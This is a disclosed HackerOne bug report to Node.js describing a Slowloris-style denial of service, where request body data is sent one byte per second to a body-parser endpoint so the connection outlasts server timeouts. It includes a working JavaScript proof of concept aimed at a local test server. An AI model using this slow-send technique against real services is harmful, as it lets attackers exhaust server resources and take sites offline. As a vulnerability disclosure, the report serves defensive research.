# Slowloris, body parsing

## Report Details
- **Report ID**: 799072
- **URL**: https://hackerone.com/reports/799072
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-02-18T21:52:59.796Z
- **Disclosed**: 2020-10-17T19:25:57.436Z

## Reporter
- **Username**: underflow0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:** [add summary of the vulnerability]
Attackers can cause a Denial of Service by sending HTTP request body data extremely slowly to keep a connection open by maintaining activity, and use resources over an extended period.

**Description:** [add more details about this vulnerability]
Body data is sent one byte at a time, slowly, in a HTTP request. The connection stays open, hogging resources. There is no builtin feature that can make this trigger a timeout, as long as the bytes are sent at an interval lower than the `server.timeout` value if it is set. May not technically be a Node.js bug since it doesn't handle parsing of the body, but the typically body parsing library (e.g. https://www.npmjs.com/package/body-parser) does not implement any feature to mitigate the vulnerability.


## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. Start a HTTP server and set the server timeout to 2 seconds.
  2. Add a library that parses the request body.
  2. Open a connection to the server.
  3. Send a HTTP header.
  4. Send the body, 1 byte per second.

## Impact: [add why this issue matters]
See summary.

## Supporting Material/References:

Code to reproduce
```
const bodyParser = require('body-parser');
const express = require('express');
const net = require('net');
const http = require('http');

async function run() {
    const expressApp = express();

    expressApp.use(bodyParser.json());

    expressApp.use(async (req, res) => {
        res.send({body: req.body});
    });

    const server = http.createServer(expressApp);

    setInterval(() => {
        console.log(server.connections);
    },  1000);

    server.keepAliveTimeout = 2000;
    server.timeout = 2000;

    await new Promise(resolve => {
        server.listen(3000, '127.0.0.1', () => {
            resolve();
        });
    });

    const client = new net.Socket();

    const length = 5000;

    const msg = `GET / HTTP/1.1
Host: localhost:3000
Accept: */*
Content-Type: application/json
Content-Length: ${length}

["`;

    client.connect(3000, '127.0.0.1', async function () {
        client.write(msg);

        for (let i = 0; i < length - 4; i++) {
            await new Promise(resolve => {
                setTimeout(resolve, 1000);
            });

            client.write('' + (i % 10));
        }

        client.write('"]');
    });
}

run();
```

## Impact

Attackers can cause a Denial of Service by sending HTTP request body data extremely slowly to keep a connection open and use resources over an extended period.

## Attachments
No attachments
